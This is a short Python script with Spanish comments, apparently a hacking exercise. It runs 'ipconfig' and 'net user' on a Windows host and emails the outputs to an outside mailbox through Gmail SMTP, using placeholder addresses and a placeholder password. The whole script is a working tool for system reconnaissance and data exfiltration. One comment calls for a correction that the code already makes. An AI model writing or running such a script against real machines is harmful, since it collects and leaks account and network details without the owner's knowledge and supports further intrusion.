#!/usr/bin/env python3
import subprocess  # Para ejecutar comandos del sistema operativo
import smtplib  # Para el envío de emails
from email.mime.text import MIMEText  # Para crear el cuerpo del mensaje de email
from termcolor import colored  # Para imprimir mensajes de salida en la terminal con colores

# Función para enviar emails
def send_email(subject, body, sender, recipients, password):
    # Crea un objeto MIMEText que representa el email
    msg = MIMEText(body)
    # Configura el asunto, remitente y destinatarios del email
    msg['Subject'] = subject
    msg['From'] = sender
    msg['To'] = ', '.join(recipients)

    # Conexión segura con el servidor SMTP de Gmail y envío del email
    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
        smtp_server.login(sender, password)  # Autenticación
        smtp_server.sendmail(sender, recipients, msg.as_string())  # Envío del email
    print(colored(f"\n[+] Email sent Successfully!!", "green"))  # Confirmación

# Función para ejecutar comandos en el sistema
def run_command(command):
    # Ejecuta el comando y captura la salida
    output_command = subprocess.check_output(command, shell=True)
    # Devuelve la salida decodificada para su correcta visualización
    return output_command.decode("cp850")  # Decodifica usando cp850 para Windows

if __name__ == '__main__':
    # Ejecuta el comando 'ipconfig' y almacena la salida
    ipconfig_output = run_command("ipconfig")
    # Ejecuta el comando 'net user' para obtener información de los usuarios del sistema
    users_info = run_command("net user")

    # Envía la salida de 'ipconfig' por email
    send_email("Ipconfig INFO", ipconfig_output, "elquenviaelmensaje@gmail.com", ["Elquerecibeelmensaje@gmail.com"], "Contraseña de la API gmail")
    # Envía la salida de 'net user' por email
    # Corrección: Se debe enviar users_info en lugar de ipconfig_output
    send_email("Users INFO", users_info, "elquenviaelmensaje@gmail.com", ["Elquerecibeelmensaje@gmail.com"], "Contraseña de la API gmail")
